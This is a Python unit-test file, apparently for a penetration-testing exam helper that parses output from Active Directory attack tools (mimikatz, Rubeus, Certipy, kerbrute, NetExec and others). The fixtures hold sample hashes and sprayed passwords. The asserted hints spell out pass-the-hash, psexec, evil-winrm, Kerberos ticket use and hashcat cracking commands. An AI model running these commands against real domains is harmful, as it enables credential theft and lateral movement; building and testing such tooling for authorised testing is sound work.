"""Top-10 AD detectors (the AD set is 40 of 100 exam points): secretsdump,
mimikatz, Rubeus asktgt / s4u, Certipy pfx + ccache, kerbrute, NetExec Pwn3d!,
PowerView KCD / RBCD, GetNPUsers / GetUserSPNs hashes, bloodyAD. Every string
below was observed by running the fixture through the current detectors; the
tests pin exact severities, line numbers, detail prefixes and Evidence kinds
the correlator depends on."""
import unittest

from tests._helpers import (NT, BLANK_LM, RUBEUS_ASKTGT, RUBEUS_S4U, SECRETSDUMP,
                            run_keyword, run_patterns, patterns, hint_names_banned_tool)

MIMIKATZ = ("Authentication Id : 0 ; 996 (00000000:000003e4)\n"
            "User Name         : jdoe\n"
            "        msv :\n"
            "         [00000003] Primary\n"
            "         * Username : jdoe\n"
            "         * Domain   : CORP\n"
            "         * NTLM     : " + NT + "\n"
            "         * SHA1     : 0123456789abcdef0123456789abcdef01234567\n")
CERTIPY = ("[*] Saving certificate and private key to 'administrator.pfx'\n"
           "[*] Saving certificate and private key to 'jdoe.pfx'\n"
           "[*] Saving credential cache to 'jdoe.ccache'\n")
KERBRUTE = ("2024/01/15 15:15:22 >  [+] VALID LOGIN:\t svc_backup@corp.local:Summer2024!\n"
            "2024/01/15 15:15:23 >  [+] VALID LOGIN:\t jdoe@corp.local:Summer2024!\n")
NXC_PWN3D = ("SMB         10.10.11.5      445    DC01             [*] Windows Server 2019 (name:DC01) (domain:corp.local)\n"
             "SMB         10.10.11.5      445    DC01             [+] corp.local\\jdoe:Summer2024! (Pwn3d!)\n"
             "WINRM       10.10.11.7      5985   WEB01            [+] corp.local\\jdoe:" + NT + " (Pwn3d!)\n")
POWERVIEW = ("samaccountname               : SQL01$\n"
             "useraccountcontrol           : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION\n"
             "msds-allowedtodelegateto     : {CIFS/dc01.corp.local, MSSQLSvc/DB01:1433}\n"
             "\n"
             "samaccountname                              : WEB01$\n"
             "msds-allowedtoactonbehalfofotheridentity    : System.Security.AccessControl.RawSecurityDescriptor\n")
ASREP = ("$krb5asrep$23$jdoe@CORP.LOCAL:3f1a9c2e7b4d8e6f5a0c1b2d3e4f5a6b$9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a"
         "3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a")
TGS = ("$krb5tgs$23$*svc_sql$CORP.LOCAL$CORP.LOCAL/svc_sql*$7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d$1f2e3d4c5b6a7f8e"
       "9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e9d0c")
KRB_HASHES = "[-] User krbtgt doesn't have UF_DONT_REQUIRE_PREAUTH set\n" + ASREP + "\n" + TGS + "\n"
BLOODYAD = ("$ bloodyAD --host 10.10.11.5 -d corp.local -u jdoe -p 'Summer2024!' set password svc_backup 'NewPass123!'\n"
            "[+] Password changed successfully!\n")


class AdDetectorTests(unittest.TestCase):
    # 1
    def test_secretsdump_rows_bind_user_to_nt(self):
        r, s = run_patterns(SECRETSDUMP)
        ph = {f["line"]: f for f in r.cat("PASSWORD HASHES")}
        self.assertEqual(ph[1]["severity"], "HIGH")
        self.assertEqual(ph[1]["detail"], f"NTLM (NT) Administrator: {NT}")
        self.assertIn(f"netexec smb <DC-IP> -u 'Administrator' -H {NT}", ph[1]["hint"])
        self.assertIn("hashcat -m 1000", ph[1]["hint"])
        self.assertEqual(ph[2]["severity"], "MEDIUM")
        self.assertTrue(ph[2]["detail"].startswith("NTLM pair (NT is blank):"), ph[2]["detail"])
        self.assertEqual(ph[3]["severity"], "HIGH")
        self.assertEqual(ph[3]["detail"], f"NTLM (NT) jdoe: {NT}")      # CORP\ prefix stripped
        path = ph[1]["file"]
        self.assertEqual(list(patterns.HASHES),
                         [("1000", "NTLM", NT, path, 1), ("1000", "NTLM", NT, path, 3)])

    # 2
    def test_mimikatz_sekurlsa_ntlm(self):
        r, _ = run_keyword(MIMIKATZ, ".log")
        f = [x for x in r.findings if "NTLM (NT)" in x["detail"]]
        self.assertEqual(len(f), 1, f)
        f = f[0]
        self.assertEqual((f["severity"], f["category"], f["line"]), ("HIGH", "PASSWORD HASHES", 5))
        self.assertEqual(f["detail"], f"NTLM (NT) CORP\\jdoe: {NT}")
        self.assertIn(f"nxc smb <host> -d CORP -u 'jdoe' -H {NT}", f["hint"])
        r2, _ = run_keyword(MIMIKATZ.replace(NT, "31d6cfe0d16ae931b73c59d7e0c089c0"), ".log")
        self.assertEqual([x for x in r2.findings if "NTLM (NT)" in x["detail"]], [])

    # 3
    def test_rubeus_asktgt_success(self):
        r, s = run_keyword(RUBEUS_ASKTGT)
        f = r.cat("AD_ATTACK")
        self.assertEqual(len(f), 1, f)
        self.assertEqual((f[0]["severity"], f[0]["line"]), ("HIGH", 1))
        self.assertTrue(f[0]["detail"].startswith(
            "Rubeus asktgt SUCCESS: TGT held for svc_backup@CORP.LOCAL (hash=C4B0E1B10C7CE2C4...)"),
            f[0]["detail"])
        self.assertIn("lateral Kerberos pivot ready", f[0]["detail"])
        self.assertIn("Rubeus.exe ptt /ticket:<b64>", f[0]["hint"])
        ev = [e for e in s.items if e.kind == "tgt_landed"]
        self.assertEqual(len(ev), 1)
        self.assertEqual((ev[0].user, ev[0].domain, ev[0].meta["tool"]),
                         ("svc_backup", "CORP.LOCAL", "rubeus_asktgt"))

    # 4
    def test_rubeus_asktgt_doc_gate_and_incomplete_block(self):
        r, _ = run_keyword(RUBEUS_ASKTGT, ".md")
        self.assertEqual(r.cat("AD_ATTACK"), [])
        r, _ = run_keyword(RUBEUS_ASKTGT.replace("[+] TGT request successful!\n", ""))
        self.assertEqual(r.cat("AD_ATTACK"), [])          # success marker required

    # 5
    def test_rubeus_s4u_landed_severity_by_impersonated_user(self):
        r, s = run_keyword(RUBEUS_S4U)
        f = r.cat("AD_ATTACK")
        self.assertEqual(len(f), 1, f)
        self.assertEqual((f[0]["severity"], f[0]["line"]), ("CRITICAL", 1))
        self.assertEqual(f[0]["detail"],
                         "Rubeus s4u LANDED: administrator impersonated against CIFS/dc01.corp.local"
                         " - constrained-delegation abuse complete")
        ev = [e for e in s.items if e.kind == "delegation_landed"]
        self.assertEqual(len(ev), 1)
        self.assertEqual(ev[0].meta, {"tool": "rubeus_s4u", "impersonated": "administrator",
                                      "target_spn": "CIFS/dc01.corp.local"})
        low = RUBEUS_S4U.replace("'administrator'", "'svc_lowpriv'").replace(":  administrator", ":  svc_lowpriv")
        r, _ = run_keyword(low)
        f = r.cat("AD_ATTACK")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "HIGH")
        self.assertTrue(f[0]["detail"].startswith("Rubeus s4u LANDED: svc_lowpriv impersonated"))

    # 6
    def test_certipy_pfx_and_ccache_saved(self):
        r, s = run_keyword(CERTIPY)
        cp = {f["line"]: f for f in r.cat("CRED PAIRS")}
        self.assertEqual(cp[1]["severity"], "CRITICAL")
        self.assertEqual(cp[1]["detail"],
                         "Certipy PFX captured: administrator.pfx (administrator) - ADCS attack landed")
        self.assertIn("certipy auth -pfx 'administrator.pfx'", cp[1]["hint"])
        self.assertEqual(cp[2]["severity"], "HIGH")
        self.assertEqual(cp[2]["detail"], "Certipy PFX captured: jdoe.pfx (jdoe) - ADCS attack landed")
        rc = {f["line"]: f for f in r.cat("RECON")}
        self.assertEqual(rc[3]["severity"], "HIGH")
        self.assertEqual(rc[3]["detail"], "Certipy ccache saved: jdoe.ccache - PKINIT TGT ready")
        self.assertIn("export KRB5CCNAME='jdoe.ccache'", rc[3]["hint"])
        self.assertEqual({e.kind for e in s.items}, {"pfx", "ccache"})
        self.assertEqual([e.user for e in s.items if e.kind == "pfx"], ["administrator", "jdoe"])

    # 7
    def test_kerbrute_valid_login(self):
        r, s = run_keyword(KERBRUTE)
        cp = r.cat("CRED PAIRS")
        self.assertEqual(len(cp), 2, cp)                   # no generic user:pass duplicate
        self.assertTrue(all(f["severity"] == "HIGH" for f in cp))
        f1 = [f for f in cp if f["line"] == 1][0]
        self.assertEqual(f1["detail"],
                         "kerbrute passwordspray hit: corp.local\\svc_backup:Summer2024! - CONFIRMED VALID at KDC")
        self.assertIn("nxc smb <target-cidr> -u 'svc_backup' -p 'Summer2024!' --continue-on-success", f1["hint"])
        self.assertIn("impacket-psexec 'corp.local/svc_backup:Summer2024!@<host>'", f1["hint"])
        ev = [e for e in s.items if e.kind == "plaintext"]
        self.assertEqual(len(ev), 2)
        self.assertTrue(all(e.plaintext == "Summer2024!" and e.domain == "corp.local"
                            and e.meta["source"] == "kerbrute" for e in ev))
        self.assertEqual({e.user for e in ev}, {"svc_backup", "jdoe"})

    # 8
    def test_netexec_pwn3d_local_admin(self):
        r, s = run_keyword(NXC_PWN3D)
        la = {f["line"]: f for f in r.cat("RECON") if f["detail"].startswith("LOCAL ADMIN:")}
        self.assertEqual(sorted(la), [2, 3])
        self.assertTrue(all(f["severity"] == "HIGH" for f in la.values()))
        self.assertEqual(la[2]["detail"],
                         "LOCAL ADMIN: corp.local\\jdoe on 10.10.11.5 (DC01) via SMB - PSEXEC READY")
        self.assertIn("impacket-psexec 'corp.local/jdoe:Summer2024!'@10.10.11.5", la[2]["hint"])
        self.assertEqual(la[3]["detail"],
                         "LOCAL ADMIN: corp.local\\jdoe on 10.10.11.7 (WEB01) via WINRM - PSEXEC READY")
        self.assertIn(f"evil-winrm -i 10.10.11.7 -u 'jdoe' -H '{NT}'", la[3]["hint"])
        cp = [f for f in r.cat("CRED PAIRS") if f["detail"] == "jdoe:Summer2024!"]
        self.assertEqual(len(cp), 1)
        self.assertEqual(cp[0]["severity"], "CRITICAL")
        self.assertTrue({e.kind for e in s.items} >= {"admin", "plaintext", "service"})
        adm = {e.host: e for e in s.items if e.kind == "admin"}
        self.assertEqual(adm["10.10.11.5"].meta,
                         {"hostname": "DC01", "protocol": "SMB", "cred_kind": "plaintext"})
        self.assertEqual(adm["10.10.11.7"].meta["cred_kind"], "hash")

    # 9
    def test_powerview_kcd_and_rbcd(self):
        r, s = run_keyword(POWERVIEW)
        kcd = [f for f in r.cat("RECON") if f["detail"].startswith("KCD constrained delegation")]
        self.assertEqual(len(kcd), 1)
        self.assertEqual((kcd[0]["severity"], kcd[0]["line"]), ("CRITICAL", 1))
        self.assertTrue(kcd[0]["detail"].startswith(
            "KCD constrained delegation on SQL01$ (DC SPN in target list - DA path via S4U) - "
            "allowed SPNs: CIFS/dc01.corp.local, MSSQLSvc/DB01:1433"), kcd[0]["detail"])
        # NB: the single-line "RBCD attribute (msDS-AllowedToActOnBehalfOfOtherIdentity)" HIGH
        # marker also fires on line 6 - filter with startswith, never assert len(RECON) == 2.
        rbcd = [f for f in r.cat("RECON")
                if f["detail"].startswith("RBCD (Resource-Based Constrained Delegation) on WEB01$")]
        self.assertEqual(len(rbcd), 1)
        self.assertEqual((rbcd[0]["severity"], rbcd[0]["line"]), ("CRITICAL", 5))
        hosts = {e.fact: e.host for e in s.items if e.kind == "host"}
        self.assertEqual(hosts, {"kcd": "sql01$", "rbcd_target": "web01$"})
        # KCD hint text is deliberately NOT asserted: it carries a literal '{_dom}'
        # (un-rendered f-string) today - see notes / keyword.py KCD detector.
        r2, _ = run_keyword(POWERVIEW.replace("{CIFS/dc01.corp.local, MSSQLSvc/DB01:1433}",
                                              "{MSSQLSvc/DB01:1433}"))
        kcd2 = [f for f in r2.cat("RECON") if f["detail"].startswith("KCD constrained delegation")]
        self.assertEqual(len(kcd2), 1)
        self.assertEqual(kcd2[0]["severity"], "HIGH")
        self.assertNotIn("(DC SPN", kcd2[0]["detail"])

    # 10
    def test_getnpusers_asrep_and_getuserspns_tgs(self):
        r, s = run_patterns(KRB_HASHES)
        ph = {f["line"]: f for f in r.cat("PASSWORD HASHES")}
        self.assertEqual(sorted(ph), [2, 3])
        self.assertEqual(ph[2]["severity"], "HIGH")
        self.assertTrue(ph[2]["detail"].startswith("AS-REP roast (RC4): $krb5asrep$23$jdoe@CORP.LOCAL:"))
        self.assertIn("hashcat -m 18200", ph[2]["hint"])
        self.assertEqual(ph[3]["severity"], "HIGH")
        self.assertTrue(ph[3]["detail"].startswith("Kerberoast TGS (RC4): $krb5tgs$23$*svc_sql$CORP.LOCAL$"))
        self.assertIn("hashcat -m 13100", ph[3]["hint"])
        self.assertEqual([(m, n) for m, n, *_ in patterns.HASHES],
                         [("18200", "AS-REP roast (RC4)"), ("13100", "Kerberoast TGS (RC4)")])
        self.assertIn("user", {e.kind for e in s.items})     # user binding for R-CRACK chains
        doc = ("[-] User krbtgt doesn't have UF_DONT_REQUIRE_PREAUTH set\n- " + ASREP + "\n- " + TGS + "\n")
        r2, _ = run_patterns(doc, ".md")
        self.assertEqual(r2.cat("PASSWORD HASHES"), [])

    # 11
    def test_bloodyad_set_password_landed(self):
        r, s = run_keyword(BLOODYAD)
        f = [x for x in r.cat("RECON") if x["detail"].startswith("bloodyAD password reset landed")]
        self.assertEqual(len(f), 1)
        self.assertEqual((f[0]["severity"], f[0]["line"]), ("CRITICAL", 2))
        self.assertEqual(f[0]["detail"], "bloodyAD password reset landed: svc_backup pw reset (attack complete)")
        self.assertIn("nxc smb <dc> -u 'svc_backup' -p '<newpw>'", f[0]["hint"])
        ev = [e for e in s.items if e.kind == "attack_landed"]
        self.assertEqual(len(ev), 1)
        self.assertEqual((ev[0].user, ev[0].meta["attack_type"]), ("svc_backup", "pw_reset"))
        r2, _ = run_keyword("[+] Password changed successfully!\n")
        f2 = [x for x in r2.cat("RECON") if x["detail"].startswith("bloodyAD password reset landed")]
        self.assertEqual(len(f2), 1)
        self.assertIn("<unknown> pw reset", f2[0]["detail"])

    # 12
    def test_ad_hints_never_name_a_banned_tool(self):
        runs = [(run_keyword, MIMIKATZ, ".log"), (run_keyword, RUBEUS_ASKTGT, ".txt"),
                (run_keyword, RUBEUS_S4U, ".txt"), (run_keyword, CERTIPY, ".txt"),
                (run_keyword, KERBRUTE, ".txt"), (run_keyword, NXC_PWN3D, ".txt"),
                (run_keyword, POWERVIEW, ".txt"), (run_patterns, KRB_HASHES, ".txt"),
                (run_keyword, BLOODYAD, ".txt")]
        n = 0
        for runner, text, ext in runs:
            r, _ = runner(text, ext)
            for f in r.findings:
                if f["hint"]:
                    n += 1
                    with self.subTest(detail=f["detail"][:70]):
                        self.assertFalse(hint_names_banned_tool(f["hint"]), f["hint"])
        self.assertGreater(n, 10)


if __name__ == "__main__":
    unittest.main()
